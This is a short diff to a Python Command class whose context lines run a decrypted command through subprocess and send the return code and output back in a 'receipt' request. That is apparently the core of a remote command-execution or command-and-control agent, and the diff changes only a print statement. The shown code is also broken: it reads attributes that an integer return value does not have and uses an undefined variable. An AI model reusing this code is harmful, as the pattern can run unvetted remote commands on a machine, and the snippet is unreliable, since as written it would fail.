@@ -63,6 +63,6 @@ class Command:
             })
         else:
             process = subprocess.call(decrypted.split())
-            print("process " + process)
+            print(process)
             request = Request(RequestType.RECEIPT)
             request.send(options={"retcode": process.retcode, "output": process.stderr if process.retcode != 0 else stdout})
